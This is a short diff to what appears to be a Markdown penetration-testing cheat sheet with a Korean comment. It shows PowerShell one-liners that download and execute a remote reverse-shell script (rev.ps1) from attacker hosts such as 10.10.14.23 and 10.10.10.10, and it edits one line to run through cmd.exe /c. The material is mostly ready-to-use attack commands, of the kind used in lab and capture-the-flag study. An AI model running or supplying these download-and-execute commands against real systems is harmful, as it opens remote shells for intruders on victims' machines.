@@ -39,8 +39,9 @@ echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.23/rev.ps1") 
 
 powershell -encodedcommand <base64>
 
-powershell.exe 'IWR http://10.10.10.10/rev.ps1 -UseBasicParsing'
+cmd.exe /c powershell.exe 'IWR http://10.10.10.10/rev.ps1 -UseBasicParsing'
 ```
+- `cmd.exe /c` : 사용하고 창을 닫는 옵션.
 
 </details>
 
